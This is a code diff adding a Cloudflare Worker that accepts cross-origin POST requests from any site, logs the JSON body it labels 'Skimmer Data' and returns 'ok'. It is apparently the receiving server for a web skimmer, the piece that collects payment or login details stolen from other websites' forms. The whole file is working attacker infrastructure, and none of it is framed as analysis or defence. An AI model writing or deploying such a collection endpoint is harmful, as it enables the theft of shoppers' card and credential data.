@@ -1,0 +1,41 @@
+export default {
+  async fetch(request, env, ctx) {
+    // 1. Handle CORS Preflight (OPTIONS)
+    if (request.method === "OPTIONS") {
+      return new Response(null, {
+        headers: {
+          "access-control-allow-origin": "*",
+          "access-control-allow-methods": "POST, GET, OPTIONS",
+          "access-control-allow-headers": "Content-Type, Authorization",
+          "access-control-max-age": "3600",
+        },
+      });
+    }
+
+    // 2. Handle POST Request (Your Skimmer Data)
+    if (request.method === "POST") {
+      try {
+        const data = await request.json();
+        console.log("Skimmer Data Received:", data); // This will show in Cloudflare Logs
+        
+        return new Response(JSON.stringify({ status: "ok" }), {
+          headers: {
+            "content-type": "application/json",
+            "access-control-allow-origin": "*",
+          },
+        });
+      } catch (error) {
+        return new Response(JSON.stringify({ error: "Invalid JSON" }), {
+          status: 400,
+          headers: {
+            "content-type": "application/json",
+            "access-control-allow-origin": "*",
+          },
+        });
+      }
+    }
+
+    // 3. Default Response
+    return new Response("Method Not Allowed", { status: 405 });
+  },
+};
